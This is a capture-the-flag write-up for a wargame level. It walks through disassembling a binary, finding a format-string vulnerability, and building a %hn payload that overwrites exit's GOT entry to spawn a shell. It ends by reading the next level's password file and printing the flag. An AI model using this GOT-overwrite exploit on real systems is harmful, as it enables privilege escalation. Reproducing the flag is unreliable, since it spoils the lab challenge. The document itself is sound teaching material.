# Level 5

## Connect to the virtual machine with SSH

Use the flag from `level4` as the `level5` password:

```bash
ssh level5@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level5@127.0.0.1:/home/user/level5/level5 ./level5/
```

The extracted binary is saved as `level5/level5`.

## Copy the GDB dump to the host

Inside the VM, connected as `level5`, open the binary with GDB:

```bash
gdb ./level5
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level5_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas n
disas o
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level5@127.0.0.1:/tmp/level5_main_dump_gdb ./level5/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble n" \
  -ex "disassemble o" \
  ./level5/level5 > ./level5/level5_main_dump_gdb
```

## Analyze the GDB dump

`main` only calls `n`:

```asm
0x08048504 <+0>:  push   ebp
0x08048505 <+1>:  mov    ebp,esp
0x08048507 <+3>:  and    esp,0xfffffff0
0x0804850a <+6>:  call   0x80484c2 <n>
0x0804850f <+11>: leave
0x08048510 <+12>: ret
```

`n` reads input with `fgets`, then passes the input directly to `printf`:

```asm
0x080484dc <+26>: lea    eax,[ebp-0x208]
0x080484e2 <+32>: mov    DWORD PTR [esp],eax
0x080484e5 <+35>: call   0x80483a0 <fgets@plt>
0x080484ea <+40>: lea    eax,[ebp-0x208]
0x080484f0 <+46>: mov    DWORD PTR [esp],eax
0x080484f3 <+49>: call   0x8048380 <printf@plt>
0x080484f8 <+54>: mov    DWORD PTR [esp],0x1
0x080484ff <+61>: call   0x80483d0 <exit@plt>
```

This is a format-string vulnerability. The input is used as the format string.

There is also a hidden function `o`:

```asm
0x080484a4 <+0>:  push   ebp
0x080484a5 <+1>:  mov    ebp,esp
0x080484a7 <+3>:  sub    esp,0x18
0x080484aa <+6>:  mov    DWORD PTR [esp],0x80485f0
0x080484b1 <+13>: call   0x80483b0 <system@plt>
0x080484b6 <+18>: mov    DWORD PTR [esp],0x1
0x080484bd <+25>: call   0x8048390 <_exit@plt>
```

`o` runs:

```text
/bin/sh
```

But `n` does not return normally. It calls `exit(1)`, so overwriting a saved
return address is not useful here. Instead, overwrite the GOT entry for `exit`
with the address of `o`.

Find `exit@GOT`:

```bash
objdump -R level5/level5 | grep exit
```

Result:

```text
08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0
```

The target values are:

```text
exit@GOT = 0x08049838
o        = 0x080484a4
```

After the overwrite, this instruction:

```asm
call   0x80483d0 <exit@plt>
```

jumps to `o` instead of `exit`.

## Find the format-string argument index

Send a marker followed by `%x` probes:

```bash
python -c 'print "AAAA" + ".%x" * 15' | /home/user/level5/level5
```

Output:

```text
AAAA.200.b7fd1ac0.b7ff37d0.41414141.2e78252e...
```

`41414141` is `AAAA` in hexadecimal. It appears as the 4th printed argument, so
the start of our input is reachable with `%4$...`.

## Build the write

We need to write:

```text
0x080484a4
```

Use two `%hn` writes:

```text
high half: 0x0804 -> exit@GOT + 2
low half:  0x84a4 -> exit@GOT
```

The addresses are:

```text
exit@GOT + 2 = 0x0804983a -> \x3a\x98\x04\x08
exit@GOT     = 0x08049838 -> \x38\x98\x04\x08
```

Put both addresses at the start of the input:

```text
[\x3a\x98\x04\x08][\x38\x98\x04\x08][format string...]
```

From the `%x` probe, the first address is the 4th `printf` argument. The next
4 bytes are the 5th argument:

```text
%4$hn writes to exit@GOT + 2
%5$hn writes to exit@GOT
```

The two addresses print 8 bytes before the first `%hn`.

First write the high half:

```text
target high half = 0x0804 = 2052
already printed  = 8
padding needed   = 2052 - 8 = 2044
```

Then write the low half:

```text
target low half  = 0x84a4 = 33956
already printed  = 2052
padding needed   = 33956 - 2052 = 31904
```

The format string is:

```text
%2044d%4$hn%31904d%5$hn
```

## Exploitation

Run this in the VM:

```bash
(python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn"'; cat) | /home/user/level5/level5
```

The `cat` keeps stdin open for the shell started by `o`.

Check the effective identity:

```bash
whoami
```

Result:

```text
level6
```

Read the next password:

```bash
cat /home/user/level6/.pass
```

## Flag

```text
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
